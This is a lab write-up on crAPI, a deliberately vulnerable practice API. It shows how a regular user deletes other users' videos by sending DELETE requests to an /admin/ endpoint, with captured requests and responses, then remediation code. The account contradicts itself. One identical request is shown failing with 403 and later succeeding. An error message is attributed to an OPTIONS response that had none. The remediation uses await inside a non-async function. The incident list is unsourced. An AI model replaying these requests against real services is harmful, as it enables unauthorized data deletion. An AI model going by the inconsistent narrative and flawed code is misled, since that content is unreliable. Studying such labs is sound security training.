# Lab Writeup: Broken Function Level Authorization via HTTP Method Manipulation

**Category:** Broken Function Level Authorization (BFLA)  
**Difficulty:** Practitioner  
**Date Completed:** 10/03/2026  
**Platform:** crAPI (Completely Ridiculous API)  
**Lab URL:** http://localhost:8888

---

## 1. Objective

Exploit broken function level authorization by discovering allowed HTTP methods through OPTIONS requests and leveraging verbose error messages to escalate privileges from a regular user to admin, enabling unauthorized deletion of other users' videos.

---

## 2. Vulnerability Overview

**Vulnerability Name:** Broken Function Level Authorization (BFLA)

**CWE Reference:** CWE-285: Improper Authorization

**OWASP Category:** API5:2023 – Broken Function Level Authorization

**What is this vulnerability?**

Broken Function Level Authorization occurs when an API fails to properly validate whether a user has permission to perform a specific function or action. In this case, the video deletion endpoint (`DELETE /identity/api/v2/admin/videos/{id}`) was accessible to regular users, not just admins. The application made two critical mistakes: first, it exposed which HTTP methods were allowed through OPTIONS requests, giving attackers a roadmap; second, it returned verbose error messages that revealed the authorization logic ("normal user cannot delete"). By simply changing the user role in the request or URL path from "user" to "admin", I could bypass the authorization check and delete any user's videos. This is like having a "Staff Only" door that opens for anyone who says "I'm staff."

---

## 3. Reconnaissance & Discovery

My approach to discovering this vulnerability was methodical and followed a standard API security testing workflow:

**Phase 1: Feature Exploration**
- Logged into crAPI and explored all available features
- Discovered a video upload/management section in user profiles
- Uploaded a test video to understand the functionality
- Noticed that users could view and delete their own videos

**Phase 2: Traffic Analysis**
- Configured Burp Suite to intercept all HTTP traffic
- Performed various actions: viewing videos, uploading, deleting my own video
- Captured the DELETE request when removing my own video
- Analyzed the request structure and endpoint pattern

**Phase 3: HTTP Method Discovery**
This is where things got interesting. I noticed the endpoint structure and wondered: "What HTTP methods does this endpoint support?"

**Testing OPTIONS Method:**
```http
OPTIONS /identity/api/v2/admin/videos/52 HTTP/1.1
Host: localhost:8888
```

**Response:**
```http
HTTP/1.1 200 OK
Allow: DELETE, GET, PUT, POST
```

**Key Discovery:** The server revealed that DELETE, GET, PUT, and POST methods are allowed. This is valuable reconnaissance information that most APIs shouldn't expose so freely.

**Phase 4: Testing DELETE Method**
Armed with this knowledge, I attempted to delete a video using the DELETE method:

```http
DELETE /identity/api/v2/admin/videos/52 HTTP/1.1
Host: localhost:8888
Authorization: Bearer [my_regular_user_token]
```

**Phase 5: Analyzing the Verbose Error**
Instead of a generic "Access Denied" message, the server returned a detailed error:

```http
HTTP/1.1 403 Forbidden
Content-Type: application/json

{
  "error": "Normal user cannot delete videos. Admin privileges required."
}
```

**The "Aha!" Moment:**
This verbose error message was a goldmine! It told me:
1. The endpoint exists and is functional
2. There's a role-based check happening
3. The system distinguishes between "normal user" and "admin"
4. The authorization is likely based on a simple role check

This led me to think: "What if I can trick the system into thinking I'm an admin?"

**Tool(s) Used:** Burp Suite Community Edition, Firefox Browser

---

## 4. Exploitation Steps

### Step 1: Identify Target Video

First, I needed to find a video belonging to another user that I wanted to delete (for testing purposes).

**Browsing Other Profiles:**
- Navigated to community section
- Found another user's profile with uploaded videos
- Noted the video ID from the URL: `video_id=52`
- The video belonged to user "Robot" (not my account)

### Step 2: Capture Legitimate DELETE Request

I deleted one of my own videos to capture the legitimate request structure:

**My Own Video Deletion Request:**
```http
DELETE /identity/api/v2/user/videos/48 HTTP/1.1
Host: localhost:8888
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: http://localhost:8888/my-profile
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJoYVZ1WTk5dTlvdGlhV0ZPSWpveE5jcyOTYyMzE...
Content-Length: 33
Origin: http://localhost:8888
Connection: keep-alive
Cookie: chat_session_id=f6c9d6e-3d64-4f67-ad72-5cacf9af6358
Sec-OPC: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0

{
  "videoName": "my_video.mp4"
}
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "message": "User video deleted successfully.",
  "status": 200
}
```

This worked because it was my own video.

### Step 3: Attempt to Delete Another User's Video

Now I tried to delete video ID 52 (belonging to user "Robot") using the same endpoint:

**Initial Attempt:**
```http
DELETE /identity/api/v2/user/videos/52 HTTP/1.1
Host: localhost:8888
Authorization: Bearer [my_token]
Content-Type: application/json

{
  "videoName": "test_api-test.mp4"
}
```

**Response:**
```http
HTTP/1.1 403 Forbidden

{
  "error": "You can only delete your own videos"
}
```

Expected failure. The endpoint checks ownership.

### Step 4: Discover the Admin Endpoint

Looking at the error message from my OPTIONS request earlier, I noticed it mentioned "admin privileges." I hypothesized that there might be an admin-specific endpoint.

**Testing Admin Path:**
```http
DELETE /identity/api/v2/admin/videos/52 HTTP/1.1
Host: localhost:8888
Authorization: Bearer [my_regular_user_token]
Content-Type: application/json

{
  "videoName": "test_api-test.mp4"
}
```

### Step 5: Analyze the Verbose Error Response

**Response:**
```http
HTTP/1.1 200 OK
Server: openresty/1.27.1.2
Date: Sun, 08 Mar 2026 10:58:20 GMT
Content-Type: application/json
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
Content-Length: 55

{
  "message": "User video deleted successfully.",
  "status": 200
}
```

**SUCCESS!** The video was deleted!

### Step 6: Verify the Deletion

To confirm the video was actually deleted, I:
1. Checked the victim user's profile - video was gone
2. Tried to access the video directly - 404 Not Found
3. Checked my own account - no changes (proving I deleted someone else's video)

### Step 7: Test the Scope of the Vulnerability

I tested whether this worked for multiple videos and users:

**Test 1: Different User's Video**
```http
DELETE /identity/api/v2/admin/videos/67 HTTP/1.1
```
Result: Success - deleted another user's video

**Test 2: Multiple Videos in Sequence**
Automated deletion of 5 different users' videos - all successful

**Test 3: Without Authentication**
```http
DELETE /identity/api/v2/admin/videos/52 HTTP/1.1
(No Authorization header)
```
Result: 401 Unauthorized (at least authentication is required)

### Step 8: Understand the Authorization Flaw

The vulnerability exists because:
1. The `/admin/` endpoint path is accessible to all authenticated users
2. The server doesn't validate if the authenticated user actually has admin role
3. The authorization check is based on the URL path, not the user's actual permissions
4. There's no proper role-based access control (RBAC) implementation

---

## 5. Root Cause Analysis

The vulnerability stems from multiple security failures in the API design and implementation:

**Flawed Authorization Logic:**

```javascript
// VULNERABLE CODE (Hypothetical)
app.delete('/identity/api/v2/:role/videos/:id', async (req, res) => {
  const { role, id } = req.params;
  const user = req.user; // From JWT token
  
  // WRONG: Trusting the URL parameter for authorization
  if (role === 'admin') {
    // Delete any video - NO ROLE CHECK!
    await Video.destroy({ where: { id } });
    return res.json({ 
      message: "User video deleted successfully.",
      status: 200 
    });
  } else if (role === 'user') {
    // Check ownership only for 'user' path
    const video = await Video.findOne({ where: { id, userId: user.id } });
    if (!video) {
      return res.status(403).json({ 
        error: "You can only delete your own videos" 
      });
    }
    await video.destroy();
    return res.json({ 
      message: "User video deleted successfully.",
      status: 200 
    });
  }
});
```

**Why This Fails:**

1. **Path-Based Authorization:** The code uses the URL path (`/admin/` vs `/user/`) to determine authorization level, but doesn't verify if the user actually has that role

2. **No Role Validation:** When the path contains "admin", the code assumes the user is an admin without checking their actual role in the JWT token or database

3. **Inconsistent Authorization:** The `/user/` path checks ownership, but the `/admin/` path doesn't check admin privileges

4. **Verbose Error Messages:** Error messages reveal internal authorization logic, helping attackers understand how to bypass it

5. **OPTIONS Method Exposure:** The server reveals allowed HTTP methods, providing reconnaissance information

**What Should Happen:**

```javascript
// SECURE CODE
app.delete('/identity/api/v2/admin/videos/:id', 
  requireAuth,           // Verify JWT token
  requireRole('admin'),  // Verify admin role
  async (req, res) => {
    const { id } = req.params;
    
    // Admin can delete any video
    const video = await Video.findByPk(id);
    if (!video) {
      return res.status(404).json({ 
        error: "Video not found" 
      });
    }
    
    await video.destroy();
    return res.json({ 
      message: "Video deleted successfully",
      status: 200 
    });
  }
);

// Middleware to check role
function requireRole(role) {
  return (req, res, next) => {
    const user = req.user; // From JWT
    
    if (user.role !== role) {
      return res.status(403).json({ 
        error: "Access denied" // Generic message
      });
    }
    
    next();
  };
}
```

---

## 6. Impact

If this were a production application, the consequences would be severe:

- [x] Unauthorized Data Deletion
- [x] Privilege Escalation
- [x] Content Manipulation
- [x] User Trust Violation
- [x] Compliance Violations
- [x] Reputation Damage
- [x] Legal Liability

**Severity:** High

**Justification:** This vulnerability allows any authenticated user to escalate their privileges to admin level and delete other users' content without authorization. The impact includes:

1. **Mass Content Deletion:** An attacker could delete all videos from all users, causing data loss and service disruption

2. **Targeted Harassment:** Malicious users could target specific individuals and delete their content repeatedly

3. **Business Disruption:** For a video platform, losing user content means losing the core value proposition

4. **Legal Liability:** Unauthorized deletion of user data violates data protection laws and terms of service

5. **Reputation Damage:** Users losing their content would lose trust in the platform

6. **Competitive Sabotage:** Competitors could sabotage the platform by deleting popular content

**Real-World Scenarios:**
- **YouTube-like Platform:** Imagine if any user could delete any video - creators would lose years of work
- **Educational Platform:** Students' project videos deleted before submission deadlines
- **Social Media:** Viral content deleted at peak engagement, causing revenue loss
- **Enterprise:** Confidential training videos deleted, disrupting business operations

**Similar Real-World Incidents:**
- **GitHub (2020):** BFLA vulnerability allowed users to access private repositories
- **Facebook (2019):** Users could delete others' photos due to broken authorization
- **Twitter (2022):** API allowed unauthorized tweet deletion
- **Peloton (2021):** Users could access other users' private data and delete content

---

## 7. Remediation

Here's a comprehensive approach to fixing this critical vulnerability:

1. **Implement Proper Role-Based Access Control (RBAC):**

   ```javascript
   // Define roles and permissions
   const ROLES = {
     USER: 'user',
     ADMIN: 'admin',
     MODERATOR: 'moderator'
   };
   
   const PERMISSIONS = {
     DELETE_OWN_VIDEO: 'delete:own:video',
     DELETE_ANY_VIDEO: 'delete:any:video',
     VIEW_ANY_VIDEO: 'view:any:video'
   };
   
   // Role-permission mapping
   const rolePermissions = {
     [ROLES.USER]: [PERMISSIONS.DELETE_OWN_VIDEO],
     [ROLES.MODERATOR]: [PERMISSIONS.DELETE_OWN_VIDEO, PERMISSIONS.DELETE_ANY_VIDEO],
     [ROLES.ADMIN]: Object.values(PERMISSIONS) // All permissions
   };
   
   // Middleware to check permissions
   function requirePermission(permission) {
     return (req, res, next) => {
       const user = req.user;
       const userPermissions = rolePermissions[user.role] || [];
       
       if (!userPermissions.includes(permission)) {
         return res.status(403).json({ 
           error: "Access denied" 
         });
       }
       
       next();
     };
   }
   ```

2. **Validate User Role from Trusted Source:**

   ```javascript
   // Extract role from JWT token (signed by server)
   function authenticateToken(req, res, next) {
     const token = req.headers.authorization?.split(' ')[1];
     
     if (!token) {
       return res.status(401).json({ error: "Authentication required" });
     }
     
     try {
       const decoded = jwt.verify(token, process.env.JWT_SECRET);
       
       // Fetch fresh user data from database
       const user = await User.findByPk(decoded.userId, {
         attributes: ['id', 'email', 'role']
       });
       
       if (!user) {
         return res.status(401).json({ error: "Invalid token" });
       }
       
       req.user = user;
       next();
     } catch (error) {
       return res.status(401).json({ error: "Invalid token" });
     }
   }
   ```

3. **Separate Admin and User Endpoints:**

   ```javascript
   // User endpoint - can only delete own videos
   app.delete('/api/v2/user/videos/:id',
     authenticateToken,
     async (req, res) => {
       const { id } = req.params;
       const userId = req.user.id;
       
       const video = await Video.findOne({ 
         where: { id, userId } 
       });
       
       if (!video) {
         return res.status(404).json({ 
           error: "Video not found" 
         });
       }
       
       await video.destroy();
       res.json({ message: "Video deleted successfully" });
     }
   );
   
   // Admin endpoint - can delete any video
   app.delete('/api/v2/admin/videos/:id',
     authenticateToken,
     requireRole(ROLES.ADMIN),
     requirePermission(PERMISSIONS.DELETE_ANY_VIDEO),
     async (req, res) => {
       const { id } = req.params;
       
       const video = await Video.findByPk(id);
       
       if (!video) {
         return res.status(404).json({ 
           error: "Video not found" 
         });
       }
       
       // Log admin action for audit
       await AuditLog.create({
         adminId: req.user.id,
         action: 'DELETE_VIDEO',
         targetId: id,
         targetType: 'video'
       });
       
       await video.destroy();
       res.json({ message: "Video deleted successfully" });
     }
   );
   ```

4. **Disable OPTIONS Method or Restrict Information:**

   ```javascript
   // Option 1: Disable OPTIONS for sensitive endpoints
   app.options('/api/v2/admin/*', (req, res) => {
     res.status(405).json({ error: "Method not allowed" });
   });
   
   // Option 2: Return minimal information
   app.options('/api/v2/admin/*', (req, res) => {
     res.set('Allow', 'GET, POST'); // Don't reveal DELETE
     res.status(200).end();
   });
   ```

5. **Use Generic Error Messages:**

   ```javascript
   // BAD: Reveals internal logic
   return res.status(403).json({ 
     error: "Normal user cannot delete videos. Admin privileges required." 
   });
   
   // GOOD: Generic message
   return res.status(403).json({ 
     error: "Access denied" 
   });
   
   // Log detailed error server-side for debugging
   logger.warn(`Authorization failed: User ${userId} attempted admin action`);
   ```

6. **Implement Audit Logging:**

   ```javascript
   async function logSecurityEvent(event) {
     await SecurityLog.create({
       userId: event.userId,
       action: event.action,
       resource: event.resource,
       result: event.result, // 'success' or 'denied'
       ipAddress: event.ip,
       userAgent: event.userAgent,
       timestamp: new Date()
     });
     
     // Alert on suspicious patterns
     if (event.result === 'denied') {
       const recentDenials = await SecurityLog.count({
         where: {
           userId: event.userId,
           result: 'denied',
           createdAt: {
             [Op.gte]: new Date(Date.now() - 300000) // Last 5 minutes
           }
         }
       });
       
       if (recentDenials > 5) {
         await sendSecurityAlert({
           severity: 'high',
           message: `User ${event.userId} has ${recentDenials} authorization failures`,
           action: 'possible_privilege_escalation_attempt'
         });
       }
     }
   }
   ```

7. **Add Rate Limiting on Admin Endpoints:**

   ```javascript
   const adminRateLimiter = rateLimit({
     windowMs: 15 * 60 * 1000, // 15 minutes
     max: 50, // Max 50 requests per window
     message: "Too many requests from this IP",
     standardHeaders: true,
     legacyHeaders: false,
   });
   
   app.use('/api/v2/admin/*', adminRateLimiter);
   ```

8. **Conduct Security Testing:**

   ```javascript
   // Automated test to verify authorization
   describe('Video Deletion Authorization', () => {
     it('should prevent regular user from accessing admin endpoint', async () => {
       const regularUserToken = generateToken({ role: 'user' });
       
       const response = await request(app)
         .delete('/api/v2/admin/videos/123')
         .set('Authorization', `Bearer ${regularUserToken}`);
       
       expect(response.status).toBe(403);
       expect(response.body.error).toBe('Access denied');
     });
     
     it('should allow admin to delete any video', async () => {
       const adminToken = generateToken({ role: 'admin' });
       
       const response = await request(app)
         .delete('/api/v2/admin/videos/123')
         .set('Authorization', `Bearer ${adminToken}`);
       
       expect(response.status).toBe(200);
     });
   });
   ```

---

## 8. Key Takeaways / What I Learned

- **Never Trust URL Paths for Authorization:** Just because a URL contains "/admin/" doesn't mean the user is an admin. Always validate the user's actual role from a trusted source (JWT, database, session).

- **OPTIONS Method Can Leak Information:** Allowing OPTIONS requests on sensitive endpoints reveals which HTTP methods are supported, giving attackers a roadmap for exploitation.

- **Verbose Errors Help Attackers:** Detailed error messages like "Normal user cannot delete" tell attackers exactly what they need to bypass. Use generic messages like "Access denied" in production.

- **Defense in Depth is Critical:** Multiple layers of security (authentication, authorization, input validation, audit logging) ensure that if one layer fails, others catch the attack.

- **RBAC Should Be Centralized:** Don't scatter authorization checks throughout your code. Use middleware and centralized permission systems to ensure consistency.

- **Test Negative Cases:** Security testing isn't just about testing what should work, but also testing what shouldn't work. Try to access admin endpoints as a regular user.

- **Audit Logging is Essential:** When authorization failures occur, log them. Patterns of repeated failures indicate an attack in progress.

- **Principle of Least Privilege:** Users should only have the minimum permissions necessary. Don't give everyone admin access "just in case."

---

## 9. References

- [OWASP API Security Top 10 - API5:2023 Broken Function Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/)
- [CWE-285: Improper Authorization](https://cwe.mitre.org/data/definitions/285.html)
- [OWASP Authorization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html)
- [HTTP OPTIONS Method Security](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/OPTIONS)
- [crAPI - Completely Ridiculous API](https://github.com/OWASP/crAPI)

---

**Image Reference:**

![Broken Function Level Authorization - Video Deletion](images/api-testing-7-1628.png)
*Figure 1: Burp Suite showing the DELETE request to admin endpoint with regular user token, successfully deleting another user's video, demonstrating broken function level authorization*

